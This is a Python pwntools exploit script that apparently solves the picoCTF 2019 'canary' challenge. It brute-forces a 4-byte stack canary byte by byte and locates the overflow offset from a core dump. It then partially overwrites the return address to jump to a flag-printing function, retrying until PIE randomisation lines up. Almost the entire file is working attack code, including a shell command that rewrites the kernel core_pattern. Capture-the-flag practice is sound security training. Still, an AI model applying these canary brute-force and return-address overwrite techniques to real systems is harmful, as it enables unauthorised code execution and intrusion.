# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

import os
import string

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

BUF_SIZE    = 64
FLAG_LEN    = 64
KEY_LEN     = 4

FILLER_LEN = BUF_SIZE + KEY_LEN

def brute_force_canary():
    canary = ""
    for i in range(KEY_LEN):
        for c in string.ascii_letters + string.digits:
            with context.local(log_level='ERROR'):
                try:
                    io = start()
                    io.sendlineafter("Please enter the length of the entry:\n> ", str(BUF_SIZE + len(canary) + 1))
                    io.sendlineafter("Input> ", fit({BUF_SIZE: canary + c}))
                    response = io.recvline()
                    if "Stack Smashing Detected" in response:
                        continue
                    canary += c
                    break
                finally:
                    io.close()
        else:
            raise Exception("Can't find canary")
    return canary

def send_payload(proc, payload, canary):
    assert(len(canary) == KEY_LEN)
    proc.sendlineafter("Please enter the length of the entry:\n> ", str(FILLER_LEN + len(payload)))
    proc.sendafter("Input> ", ('A' * BUF_SIZE) + (canary) + payload)

def get_overflow_offset(canary):
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(100, n = exe.bytes)
    send_payload(proc, payload, canary)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset

canary = brute_force_canary()
log.info("Canary: {}".format(canary))

overflow_offset = get_overflow_offset(canary)

response = ""

payload = fit({overflow_offset: p16(exe.symbols["display_flag"])}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

while "pico" not in response:
    io = start()
    send_payload(io, payload, canary)
    response = io.recvall()

print response